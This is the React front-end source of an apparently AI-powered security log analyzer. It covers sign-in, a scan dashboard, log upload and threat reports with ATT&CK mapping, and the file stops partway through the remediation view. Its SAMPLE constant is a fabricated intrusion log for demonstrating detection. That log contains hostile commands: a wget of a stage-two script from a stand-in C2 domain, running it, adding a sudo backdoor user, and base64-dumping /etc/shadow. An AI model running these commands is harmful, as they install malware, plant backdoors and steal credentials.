import { useState, useEffect, useRef } from 'react';
import { supabase, getToken } from './lib/supabase.js';

const API = import.meta.env.VITE_API_URL || '';

// ── Severity helpers ──────────────────────────────────────────
const SEV = {
  CRITICAL: { bg:'bg-red-500/10', border:'border-red-500/30', text:'text-red-400', dot:'bg-red-500' },
  HIGH:     { bg:'bg-orange-500/10', border:'border-orange-500/30', text:'text-orange-400', dot:'bg-orange-500' },
  MEDIUM:   { bg:'bg-amber-500/10', border:'border-amber-500/30', text:'text-amber-400', dot:'bg-amber-500' },
  LOW:      { bg:'bg-emerald-500/10', border:'border-emerald-500/30', text:'text-emerald-400', dot:'bg-emerald-500' },
};
const getSev = (l) => SEV[(l||'').toUpperCase()] || { bg:'bg-slate-800', border:'border-slate-700', text:'text-slate-400', dot:'bg-slate-500' };

const MITRE_TACTICS = [
  'Reconnaissance','Resource Dev','Initial Access','Execution',
  'Persistence','Priv Escalation','Defense Evasion','Cred Access',
  'Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact',
];

const SAMPLE = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=3389 proto=TCP  count=312
2024-01-15 02:18:47 SSH     FAIL   src=185.220.101.47  user=admin     dst=10.0.1.5
2024-01-15 02:18:49 SSH     FAIL   src=185.220.101.47  user=root      dst=10.0.1.5
2024-01-15 02:19:22 SSH     SUCCESS src=185.220.101.47 user=deploy    dst=10.0.1.5 session=44291
2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
2024-01-15 02:19:28 DNS     QUERY  src=10.0.1.5  query=malware-c2.ru  type=A  response=91.108.4.14
2024-01-15 02:19:32 PROCESS pid=9945 user=deploy cmd="chmod +x /tmp/.hidden_update && /tmp/.hidden_update"
2024-01-15 02:19:33 SYSLOG  WARN   msg="Privilege escalation via CVE-2023-0386 process gained root"
2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 proto=TCP state=ESTABLISHED msg="Reverse shell"
2024-01-15 02:19:36 FILE    MODIFY path=/etc/crontab change="Added persistence entry"
2024-01-15 02:19:38 PROCESS user=root cmd="useradd -m -s /bin/bash -G sudo svc_backup"
2024-01-15 02:19:40 PROCESS user=root cmd="cat /etc/shadow | base64"
2024-01-15 02:20:03 SSH     SUCCESS src=10.0.1.5 user=ubuntu dst=10.0.1.12 msg="Lateral movement"
2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90.3MB exfiltrated"`;

async function apiFetch(path, opts = {}) {
  const token = await getToken();
  const res = await fetch(`${API}${path}`, {
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(opts.headers || {}),
    },
    ...opts,
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
  return data;
}

// ══════════════════════════════════════════════════════════════
// SHARED UI
// ══════════════════════════════════════════════════════════════

function Badge({ level, className = '' }) {
  const s = getSev(level);
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-md text-xs font-semibold border ${s.bg} ${s.border} ${s.text} ${className}`}>
      <span className={`w-1.5 h-1.5 rounded-full ${s.dot}`} />
      {(level || 'UNKNOWN').toUpperCase()}
    </span>
  );
}

function Card({ children, className = '' }) {
  return (
    <div className={`bg-[#0f1117] border border-white/[0.06] rounded-2xl ${className}`}>
      {children}
    </div>
  );
}

function ScoreRing({ score }) {
  const r = 48, c = 2 * Math.PI * r;
  const fill = ((score || 0) / 100) * c;
  const color = score >= 80 ? '#ef4444' : score >= 60 ? '#f97316' : score >= 40 ? '#f59e0b' : '#10b981';
  const label = score >= 80 ? 'CRITICAL' : score >= 60 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW';
  return (
    <div className="flex flex-col items-center gap-2">
      <div className="relative">
        <svg width="120" height="120" viewBox="0 0 120 120">
          <circle cx="60" cy="60" r={r} fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="8" />
          <circle cx="60" cy="60" r={r} fill="none" stroke={color} strokeWidth="8"
            strokeLinecap="round" strokeDasharray={`${fill} ${c}`}
            transform="rotate(-90 60 60)"
            style={{ transition: 'stroke-dasharray 1.2s ease', filter: `drop-shadow(0 0 6px ${color}88)` }} />
        </svg>
        <div className="absolute inset-0 flex flex-col items-center justify-center">
          <span className="text-2xl font-black" style={{ color }}>{score}</span>
          <span className="text-xs text-slate-500">/ 100</span>
        </div>
      </div>
      <span className={`text-[10px] font-bold tracking-widest uppercase ${getSev(label).text}`}>{label}</span>
    </div>
  );
}

function Loader({ onComplete }) {
  const steps = [
    'Parsing security events...',
    'Loading MITRE ATT&CK v14...',
    'Extracting indicators of compromise...',
    'Mapping attack techniques...',
    'Calculating risk score...',
    'Generating remediation steps...',
    'Finalising report...',
  ];
  const [done, setDone] = useState(0);
  useEffect(() => {
    if (done < steps.length) {
      const t = setTimeout(() => setDone(d => d + 1), 420 + Math.random() * 280);
      return () => clearTimeout(t);
    } else setTimeout(onComplete, 500);
  }, [done]);
  return (
    <div className="flex flex-col items-center gap-8 py-10">
      <div className="relative w-20 h-20">
        <div className="absolute inset-0 rounded-full border-4 border-white/5" />
        <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-blue-500 animate-spin" />
        <div className="absolute inset-3 rounded-full border-4 border-transparent border-t-blue-400/40 animate-spin" style={{ animationDuration:'1.8s', animationDirection:'reverse' }} />
        <div className="absolute inset-0 flex items-center justify-center text-xl">🛡</div>
      </div>
      <div className="w-full max-w-xs space-y-3">
        <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
          <div className="h-full bg-blue-500 rounded-full transition-all duration-500" style={{ width:`${Math.round(done/steps.length*100)}%` }} />
        </div>
        <div className="space-y-2">
          {steps.map((step, i) => (
            <div key={i} className={`flex items-center gap-2 text-sm transition-colors duration-200 ${i < done ? 'text-slate-500' : i === done ? 'text-white' : 'text-slate-700'}`}>
              <span className="w-4 text-xs">{i < done ? '✓' : i === done ? '›' : '·'}</span>
              {step}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function Toast({ message, type, onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, []);
  const s = { success:'bg-emerald-500/10 border-emerald-500/30 text-emerald-300', error:'bg-red-500/10 border-red-500/30 text-red-300', info:'bg-blue-500/10 border-blue-500/30 text-blue-300' };
  return (
    <div className={`fixed top-4 right-4 z-50 flex items-center gap-3 px-4 py-3 rounded-xl border text-sm max-w-sm shadow-2xl ${s[type]||s.info}`}
      style={{ animation:'fadeIn 0.3s ease' }}>
      <span>{type==='success'?'✓':type==='error'?'✗':'ℹ'}</span>
      <span className="flex-1">{message}</span>
      <button onClick={onClose} className="opacity-40 hover:opacity-100 ml-1">✕</button>
    </div>
  );
}

function MitreMatrix({ mappings = [] }) {
  const byTactic = {};
  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic] = []; byTactic[m.tactic].push(m); });
  return (
    <div className="flex gap-1.5 min-w-max">
      {MITRE_TACTICS.map(tactic => {
        const hits = byTactic[tactic] || [];
        const active = hits.length > 0;
        return (
          <div key={tactic} className="w-[70px] flex-shrink-0">
            <div className={`text-center px-1 py-2 rounded-t-lg leading-tight ${active ? 'bg-blue-600/20 text-blue-300 border border-blue-600/30 border-b-0' : 'bg-white/[0.03] text-slate-600 border border-white/[0.06] border-b-0'}`}
              style={{ fontSize: '9px', fontWeight: 600 }}>
              {tactic}
            </div>
            <div className={`min-h-8 p-1 space-y-1 rounded-b-lg border border-t-0 ${active ? 'bg-blue-600/10 border-blue-600/30' : 'bg-white/[0.02] border-white/[0.06]'}`}>
              {hits.map((h, i) => (
                <div key={i} title={`${h.name} — ${h.confidence}%`}
                  className="text-center py-0.5 rounded cursor-help bg-blue-500/20 text-blue-300 border border-blue-500/20"
                  style={{ fontSize: '9px', fontFamily: 'monospace', fontWeight: 600 }}>
                  {h.technique}
                </div>
              ))}
            </div>
          </div>
        );
      })}
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// LANDING
// ══════════════════════════════════════════════════════════════
function Landing({ onLogin, onSignup }) {
  return (
    <div className="min-h-screen bg-[#080a0e] text-white">
      <header className="border-b border-white/[0.06] h-14 flex items-center px-6">
        <div className="max-w-5xl mx-auto w-full flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center text-sm">🛡</div>
            <span className="font-bold tracking-tight">ThreatAnalyzer</span>
            <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={onLogin} className="px-4 py-1.5 text-slate-400 hover:text-white text-sm transition-colors">Sign In</button>
            <button onClick={onSignup} className="px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Get Started</button>
          </div>
        </div>
      </header>

      <div className="max-w-5xl mx-auto px-6">
        <div className="pt-24 pb-20 text-center">
          <div className="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 rounded-full px-4 py-1.5 text-blue-400 text-xs font-medium mb-8">
            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" />
            MITRE ATT&CK v14 · AI-Powered · Free & Unlimited
          </div>
          <h1 className="text-5xl md:text-6xl font-black leading-tight tracking-tight mb-6">
            Instant Threat<br />
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-blue-600">Intelligence</span>
          </h1>
          <p className="text-slate-400 text-lg max-w-xl mx-auto mb-10 leading-relaxed">
            Paste any security log. Get a full threat report in under 30 seconds — ATT&CK mapping, IOC extraction, risk scoring, and remediation steps.
          </p>
          <div className="flex items-center justify-center gap-3">
            <button onClick={onSignup} className="px-7 py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition-all hover:scale-105 shadow-lg shadow-blue-600/20">
              Start Analysing Free →
            </button>
            <button onClick={onLogin} className="px-7 py-3 bg-white/5 hover:bg-white/10 border border-white/10 text-white font-medium rounded-xl transition-colors">
              Sign In
            </button>
          </div>
          <p className="text-slate-700 text-xs mt-3">No credit card · Unlimited scans · Results in under 30s</p>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-3 gap-3 pb-20">
          {[
            ['🗺️','MITRE ATT&CK','Automatic mapping across all 14 tactics and 200+ techniques'],
            ['🎯','IOC Extraction','IPs, domains, hashes, and file paths pulled automatically'],
            ['📊','Risk Scoring','Precise 0–100 score with severity classification'],
            ['📅','Attack Timeline','Chronological reconstruction of the full attack chain'],
            ['🔧','Remediation','Prioritised steps ranked by urgency and category'],
            ['🔒','Private','Raw logs never stored — only structured results saved'],
          ].map(([icon,title,desc]) => (
            <div key={title} className="bg-[#0f1117] border border-white/[0.06] rounded-2xl p-5 hover:border-white/10 transition-colors">
              <div className="text-xl mb-3">{icon}</div>
              <div className="font-semibold text-sm mb-1">{title}</div>
              <div className="text-slate-500 text-xs leading-relaxed">{desc}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// AUTH
// ══════════════════════════════════════════════════════════════
function Auth({ mode, onSuccess, onSwitch }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState('');
  const [isErr, setIsErr] = useState(false);

  async function submit(e) {
    e.preventDefault();
    setLoading(true); setMsg('');
    try {
      const res = mode === 'login'
        ? await supabase.auth.signInWithPassword({ email, password })
        : await supabase.auth.signUp({ email, password });
      if (res.error) throw res.error;
      if (mode === 'signup' && !res.data.session) {
        setIsErr(false); setMsg('Account created! Check your email, then sign in.'); return;
      }
      onSuccess(res.data.user);
    } catch (err) { setIsErr(true); setMsg(err.message); }
    finally { setLoading(false); }
  }

  return (
    <div className="min-h-screen bg-[#080a0e] flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="text-center mb-8">
          <div className="w-12 h-12 rounded-2xl bg-blue-600 flex items-center justify-center text-2xl mx-auto mb-4">🛡</div>
          <h2 className="text-xl font-bold text-white">{mode==='login'?'Welcome back':'Create account'}</h2>
          <p className="text-slate-500 text-sm mt-1">AI Threat Analyzer</p>
        </div>
        <Card className="p-6">
          <form onSubmit={submit} className="space-y-4">
            {[['Email','email',email,setEmail,'you@example.com'],['Password','password',password,setPassword,'••••••••']].map(([label,type,val,setter,ph]) => (
              <div key={label}>
                <label className="block text-xs font-medium text-slate-400 mb-1.5">{label}</label>
                <input type={type} value={val} onChange={e=>setter(e.target.value)} required minLength={type==='password'?6:undefined}
                  className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2.5 text-white text-sm placeholder-slate-600 focus:border-blue-500/50 focus:outline-none focus:ring-1 focus:ring-blue-500/20 transition-colors"
                  placeholder={ph} />
              </div>
            ))}
            {msg && <div className={`text-xs px-3 py-2.5 rounded-lg border ${isErr?'bg-red-500/10 border-red-500/20 text-red-400':'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'}`}>{msg}</div>}
            <button type="submit" disabled={loading}
              className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold text-sm rounded-lg transition-colors">
              {loading ? 'Please wait…' : mode==='login' ? 'Sign In' : 'Create Account'}
            </button>
          </form>
        </Card>
        <p className="text-center text-xs text-slate-600 mt-4">
          {mode==='login' ? "Don't have an account? " : 'Already have an account? '}
          <button onClick={onSwitch} className="text-blue-400 hover:text-blue-300 font-medium">{mode==='login'?'Sign up free':'Sign in'}</button>
        </p>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// DASHBOARD
// ══════════════════════════════════════════════════════════════
function Dashboard({ user, onNewScan, onViewScan }) {
  const [scans, setScans] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    apiFetch('/api/scans').then(d => { setScans(d.scans||[]); setLoading(false); }).catch(()=>setLoading(false));
  }, []);

  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-5xl mx-auto px-6 py-8">
        <div className="flex items-center justify-between mb-8">
          <div>
            <h1 className="text-xl font-bold text-white">Dashboard</h1>
            <p className="text-slate-500 text-sm mt-0.5">{user?.email}</p>
          </div>
          <button onClick={onNewScan} className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-xl transition-colors shadow-lg shadow-blue-600/20">
            + New Analysis
          </button>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
          {[
            ['Total Scans', scans.length, '📋'],
            ['Critical', scans.filter(s=>s.severity==='CRITICAL').length, '🔴'],
            ['High Risk', scans.filter(s=>s.severity==='HIGH').length, '🟠'],
            ['Avg Score', scans.length ? Math.round(scans.reduce((a,s)=>a+(s.risk_score||0),0)/scans.length) : 0, '📊'],
          ].map(([label,val,icon]) => (
            <Card key={label} className="p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-slate-500 text-xs font-medium uppercase tracking-wider">{label}</span>
                <span>{icon}</span>
              </div>
              <div className="text-2xl font-black text-white">{val}</div>
            </Card>
          ))}
        </div>

        <Card>
          <div className="px-6 py-4 border-b border-white/[0.06] flex items-center justify-between">
            <h2 className="font-semibold text-sm text-white">Recent Analyses</h2>
            <button onClick={onNewScan} className="text-blue-400 hover:text-blue-300 text-xs font-medium transition-colors">+ Run New</button>
          </div>
          {loading ? (
            <div className="py-16 text-center text-slate-600 text-sm">Loading…</div>
          ) : scans.length === 0 ? (
            <div className="py-16 text-center">
              <div className="text-3xl mb-3">🔍</div>
              <p className="text-slate-400 font-medium text-sm mb-1">No analyses yet</p>
              <p className="text-slate-600 text-xs mb-5">Paste a log file to get your first threat report</p>
              <button onClick={onNewScan} className="px-5 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Run First Analysis</button>
            </div>
          ) : (
            <div className="divide-y divide-white/[0.04]">
              {scans.map(scan => (
                <div key={scan.id} className="px-6 py-4 flex items-center gap-4 hover:bg-white/[0.02] transition-colors group">
                  <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(scan.severity).dot}`} />
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-3 mb-0.5">
                      <Badge level={scan.severity} />
                      <span className="text-white text-sm font-semibold">Risk {scan.risk_score}/100</span>
                    </div>
                    <p className="text-slate-500 text-xs">
                      {new Date(scan.created_at).toLocaleString('en-IN',{dateStyle:'medium',timeStyle:'short'})}
                      {scan.input_size ? ` · ${(scan.input_size/1024).toFixed(1)} KB` : ''}
                    </p>
                  </div>
                  <button onClick={()=>onViewScan(scan.id)} className="text-xs text-slate-600 group-hover:text-blue-400 font-medium transition-colors flex-shrink-0">
                    View →
                  </button>
                </div>
              ))}
            </div>
          )}
        </Card>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// NEW SCAN
// ══════════════════════════════════════════════════════════════
function NewScan({ onComplete, onBack }) {
  const [input, setInput] = useState('');
  const [file, setFile] = useState(null);
  const [state, setState] = useState('idle');
  const [error, setError] = useState('');
  const fileRef = useRef();

  function start() {
    if (!input.trim() && !file) { setError('Please paste log data or upload a file.'); return; }
    setState('loading'); setError('');
  }

  async function analyse() {
    try {
      let result;
      if (file) {
        const fd = new FormData(); fd.append('file', file);
        const token = await getToken();
        const res = await fetch(`${API}/api/analyze/file`, { method:'POST', headers:token?{Authorization:`Bearer ${token}`}:{}, body:fd });
        const d = await res.json();
        if (!res.ok) throw new Error(d.error);
        result = d.result;
      } else {
        const d = await apiFetch('/api/analyze', { method:'POST', body:JSON.stringify({ input }) });
        result = d.result;
      }
      onComplete(result);
    } catch (err) { setState('error'); setError(err.message || 'Analysis failed. Please try again.'); }
  }

  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-3xl mx-auto px-6 py-8">
        <div className="flex items-center gap-2 mb-8">
          <button onClick={onBack} className="text-slate-500 hover:text-white text-sm transition-colors">← Back</button>
          <span className="text-slate-700">/</span>
          <span className="text-sm text-slate-400">New Analysis</span>
        </div>

        {state === 'loading' ? (
          <Card className="px-8 py-6"><Loader onComplete={analyse} /></Card>
        ) : (
          <div className="space-y-4">
            <Card>
              <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.06]">
                <span className="text-sm font-medium text-white">Security Log Input</span>
                <div className="flex gap-3">
                  <button onClick={()=>{setInput(SAMPLE);setFile(null);}} className="text-xs text-blue-400 hover:text-blue-300 transition-colors">Load sample</button>
                  {(input||file) && <button onClick={()=>{setInput('');setFile(null);}} className="text-xs text-slate-600 hover:text-slate-400 transition-colors">Clear</button>}
                </div>
              </div>
              <textarea value={input} onChange={e=>{setInput(e.target.value);setFile(null);}}
                className="w-full bg-transparent font-mono text-emerald-400/90 text-xs p-4 resize-none focus:outline-none leading-relaxed min-h-64"
                placeholder={"Paste firewall logs, SIEM events, IOCs, network captures…\n\nClick 'Load sample' above to see an example APT attack log."}
                spellCheck={false} />
            </Card>

            <div onClick={()=>fileRef.current?.click()} onDragOver={e=>e.preventDefault()}
              onDrop={e=>{e.preventDefault();const f=e.dataTransfer.files[0];if(f){setFile(f);setInput('');}}}
              className={`border-2 border-dashed rounded-2xl p-6 text-center cursor-pointer transition-all ${file?'border-emerald-500/40 bg-emerald-500/5':'border-white/10 hover:border-white/20'}`}>
              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" className="hidden"
                onChange={e=>{const f=e.target.files[0];if(f){setFile(f);setInput('');}}} />
              {file ? (
                <div className="flex items-center justify-center gap-2 text-emerald-400 text-sm font-mono">
                  <span>📄</span><span>{file.name}</span><span className="text-emerald-600">({(file.size/1024).toFixed(1)} KB)</span>
                </div>
              ) : (
                <>
                  <p className="text-slate-500 text-sm">Drop a file here or <span className="text-blue-400">browse</span></p>
                  <p className="text-slate-700 text-xs mt-1">.txt · .log · .json · .csv · max 5 MB</p>
                </>
              )}
            </div>

            {error && <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 text-red-400 text-sm">{error}</div>}

            <button onClick={start} disabled={!input.trim()&&!file}
              className="w-full py-3 bg-blue-600 hover:bg-blue-500 disabled:bg-white/5 disabled:text-slate-600 text-white font-semibold rounded-xl transition-colors text-sm shadow-lg shadow-blue-600/20 disabled:shadow-none">
              Analyse Threat
            </button>
            <p className="text-center text-slate-700 text-xs">Raw input is never stored · Results are private to your account</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// REPORT — Fully redesigned
// ══════════════════════════════════════════════════════════════
function Report({ result, onBack, onNewScan }) {
  const [tab, setTab] = useState('overview');
  if (!result) return null;

  const tabs = [
    { id:'overview', label:'Overview', icon:'📋' },
    { id:'timeline', label:'Timeline', icon:'📅' },
    { id:'mitre', label:'ATT&CK', icon:'🗺️' },
    { id:'iocs', label:'IOCs', icon:'🎯' },
    { id:'remediation', label:'Actions', icon:'🔧' },
  ];

  return (
    <div className="min-h-screen bg-[#080a0e]">
      <div className="max-w-5xl mx-auto px-6 py-8">

        {/* Breadcrumb + actions */}
        <div className="flex items-center justify-between mb-6">
          <div>
            <div className="flex items-center gap-2 mb-2 text-sm">
              <button onClick={onBack} className="text-slate-500 hover:text-white transition-colors">← Back</button>
              <span className="text-slate-700">/</span>
              <span className="text-slate-400">Threat Report</span>
            </div>
            <div className="flex items-center gap-3">
              <h1 className="text-xl font-bold text-white">Analysis Report</h1>
              <Badge level={result.severity} />
            </div>
          </div>
          <button onClick={onNewScan} className="px-4 py-2 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-xl transition-colors">
            + New Analysis
          </button>
        </div>

        {/* Summary row */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 mb-5">
          <Card className="p-5 flex items-center gap-5">
            <ScoreRing score={result.riskScore||0} />
            <div>
              <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Risk Score</p>
              <div className="flex flex-wrap gap-1.5">
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.mitreMapping?.length||0} techniques</span>
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.iocs?.length||0} IOCs</span>
                <span className="text-xs bg-white/5 border border-white/10 px-2 py-0.5 rounded text-slate-400">{result.affectedSystems?.length||0} systems</span>
              </div>
            </div>
          </Card>
          <Card className="lg:col-span-2 p-5">
            <p className="text-slate-500 text-xs uppercase tracking-wider mb-2">Executive Summary</p>
            <p className="text-slate-200 text-sm leading-relaxed">{result.summary}</p>
            {result.affectedSystems?.length > 0 && (
              <div className="flex flex-wrap gap-2 mt-3 pt-3 border-t border-white/[0.06]">
                {result.affectedSystems.map((sys,i) => {
                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
                  return (
                    <span key={i} className={`text-xs font-mono px-2 py-0.5 rounded border ${getSev(sl).bg} ${getSev(sl).border} ${getSev(sl).text}`}>
                      {sys.host} <span className="opacity-50">({sys.risk}%)</span>
                    </span>
                  );
                })}
              </div>
            )}
          </Card>
        </div>

        {/* Tabs */}
        <div className="flex gap-1 mb-5 bg-white/[0.03] border border-white/[0.06] rounded-xl p-1">
          {tabs.map(t => (
            <button key={t.id} onClick={()=>setTab(t.id)}
              className={`flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg text-xs font-medium transition-all ${tab===t.id?'bg-white/10 text-white':'text-slate-500 hover:text-slate-300'}`}>
              <span>{t.icon}</span>
              <span className="hidden sm:inline">{t.label}</span>
            </button>
          ))}
        </div>

        {/* Overview */}
        {tab==='overview' && (
          <div className="space-y-4">
            <Card>
              <div className="px-5 py-4 border-b border-white/[0.06]">
                <h3 className="font-semibold text-sm text-white">Affected Systems</h3>
              </div>
              <div className="divide-y divide-white/[0.04]">
                {(result.affectedSystems||[]).map((sys,i) => {
                  const sl = sys.risk>75?'CRITICAL':sys.risk>50?'HIGH':sys.risk>25?'MEDIUM':'LOW';
                  return (
                    <div key={i} className="px-5 py-3.5 flex items-center gap-4">
                      <div className={`w-2 h-2 rounded-full flex-shrink-0 ${getSev(sl).dot}`} />
                      <span className="font-mono text-sm text-white flex-1">{sys.host}</span>
                      <span className="text-xs text-slate-500 hidden sm:block">{sys.status}</span>
                      <div className="flex items-center gap-3">
                        <div className="w-20 h-1.5 bg-white/5 rounded-full overflow-hidden">
                          <div className="h-full rounded-full" style={{ width:`${sys.risk}%`, background:sys.risk>75?'#ef4444':sys.risk>50?'#f97316':'#f59e0b', transition:'width 0.8s ease' }} />
                        </div>
                        <span className={`text-xs font-bold font-mono w-10 text-right ${getSev(sl).text}`}>{sys.risk}%</span>
                      </div>
                    </div>
                  );
                })}
              </div>
            </Card>
            <Card>
              <div className="px-5 py-4 border-b border-white/[0.06] flex items-center justify-between">
                <h3 className="font-semibold text-sm text-white">MITRE ATT&CK Coverage</h3>
                <button onClick={()=>setTab('mitre')} className="text-xs text-blue-400 hover:text-blue-300 transition-colors">View details →</button>
              </div>
              <div className="p-5 overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
            </Card>
          </div>
        )}

        {/* Timeline */}
        {tab==='timeline' && (
          <Card>
            <div className="px-5 py-4 border-b border-white/[0.06]">
              <h3 className="font-semibold text-sm text-white">Attack Timeline</h3>
              <p className="text-slate-500 text-xs mt-0.5">Chronological reconstruction of observed events</p>
            </div>
            <div className="p-5">
              <div className="relative">
                <div className="absolute left-[5px] top-2 bottom-2 w-px bg-white/[0.06]" />
                <div className="space-y-6">
                  {(result.timeline||[]).map((ev,i) => (
                    <div key={i} className="flex gap-4">
                      <div className={`w-3 h-3 rounded-full flex-shrink-0 mt-1 border-2 border-[#0f1117] ${getSev(ev.severity).dot}`} />
                      <div className="flex-1">
                        <div className="flex flex-wrap items-center gap-2 mb-1.5">
                          <span className="font-mono text-xs text-slate-500 bg-white/[0.04] px-2 py-0.5 rounded">{ev.time}</span>
                          <Badge level={ev.severity} />
                          {ev.tactic && <span className="text-xs bg-blue-500/10 border border-blue-500/20 text-blue-400 px-2 py-0.5 rounded font-mono">{ev.tactic}</span>}
                        </div>
                        <p className="text-slate-200 text-sm leading-relaxed">{ev.event}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </Card>
        )}

        {/* MITRE */}
        {tab==='mitre' && (
          <div className="space-y-4">
            <Card>
              <div className="px-5 py-4 border-b border-white/[0.06]">
                <h3 className="font-semibold text-sm text-white">ATT&CK Matrix</h3>
              </div>
              <div className="p-5 overflow-x-auto"><MitreMatrix mappings={result.mitreMapping||[]} /></div>
            </Card>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              {(result.mitreMapping||[]).map((m,i) => (
                <Card key={i} className="p-4">
                  <div className="flex items-center justify-between mb-2">
                    <span className="font-mono text-xs font-bold text-blue-400 bg-blue-500/10 border border-blue-500/20 px-2 py-0.5 rounded">{m.technique}</span>
                    <span className="text-xs text-slate-600">{m.confidence}% conf.</span>
                  </div>
                  <p className="font-semibold text-sm text-white mb-0.5">{m.name}</p>
                  <p className="text-xs text-slate-500 font-mono mb-2">{m.tactic}</p>
                  <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
                    <div className="h-full bg-blue-500 rounded-full" style={{ width:`${m.confidence}%` }} />
                  </div>
                </Card>
              ))}
            </div>
          </div>
        )}

        {/* IOCs */}
        {tab==='iocs' && (
          <div className="space-y-3">
            {(result.iocs||[]).map((ioc,i) => (
              <Card key={i} className="p-4">
                <div className="flex flex-wrap items-start gap-3">
                  <div className="flex items-center gap-2 flex-shrink-0 pt-0.5">
                    <span className={`text-xs font-mono font-semibold px-2.5 py-1 rounded-md border ${getSev(ioc.threat).bg} ${getSev(ioc.threat).border} ${getSev(ioc.threat).text}`}>{ioc.type}</span>
                    <Badge level={ioc.threat} />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="font-mono text-sm text-red-300 break-all font-medium mb-1">{ioc.value}</p>
                    <p className="text-slate-400 text-xs leading-relaxed">{ioc.description}</p>
                  </div>
                </div>
              </Card>
            ))}
          </div>
        )}

        {/* Remediation */}
        {tab==='remediation' && (
          <div className="space-y-3">
            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i) => {
              const catStyle = {
                Containment:'bg-red-500/10 border-red-500/20 text-red-400',
                Eradication:'bg-orange-500/10 border-orange-500/20 text-orange-400',
                Recovery:'bg-emerald-500/10 border-emerald-500/20 text-emerald-400',
                Hardening:'bg-blue-500/10 border-blue-500/20 text-blue-400',
              }[step.category] || 'bg-slate-500/10 border-slate-500/20 text-slate-400';
              return (
                <Card key={i} className={step.urgent?'border-red-500/20':''}>
                  <div className="p-4 flex gap-4">
                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center text-sm font-black flex-shrink-0 ${step.urgent?'bg-red-500/20 text-red-400':'bg-white/5 text-slate-500'}`}>
                      {step.priority}
                    </div>
                    <div className="flex-1">
                      <div className="flex flex-wrap items-center gap-2 mb-2">
                        <span className={`text-xs font-medium px-2.5 py-0.5 rounded-md border ${catStyle}`}>{step.category}</span>
                        {step.urgent && (
                          <span className="text-xs font-bold px-2.5 py-0.5 rounded-md bg-red-500/10 border border-red-500/20 text-red-400 flex items-center gap-1">
                            <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" /> URGENT
                          </span>
                        )}
                      </div>
